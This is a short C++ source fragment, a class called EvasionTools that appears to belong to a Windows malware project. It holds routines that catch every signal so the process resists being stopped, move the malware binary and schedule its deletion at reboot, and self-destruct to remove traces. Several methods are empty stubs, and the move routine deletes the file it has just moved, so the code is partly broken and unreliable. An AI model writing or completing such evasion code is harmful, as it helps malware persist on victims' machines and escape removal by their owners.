class EvasionTools{
	private:
		HANDLE fh;
		char* tmp	=	NULL;

	public:
		static void ChangePID(int _s=0){
			return;
		}
		void HandleAllSignals(function Handle){
			for (int tmp=1; tmp<=64; tmp++)
				signal(tmp, Handle);
		}
		void HandleSignal(int signl, function Handle){
			signal(signl, Handle);
		}
		int MoveMalware(const char* newpath){
			if (MoveFile(Current.name, newpath)){
				strncpy(Current.name, newpath, PAMAX);

				DeleteFile(newpath);

				MoveFileEx(Current.name, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
				return 0;
			}
			return 1;
		}
		int MoveIntoMemory(){
			return 1;
		}
		int MoveBackToDisk(const char* loc=Current.name){
			return 1;
		}

		int SelfDestroy(){
			MoveFileEx(Current.name, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
			    return 0;
		}
};

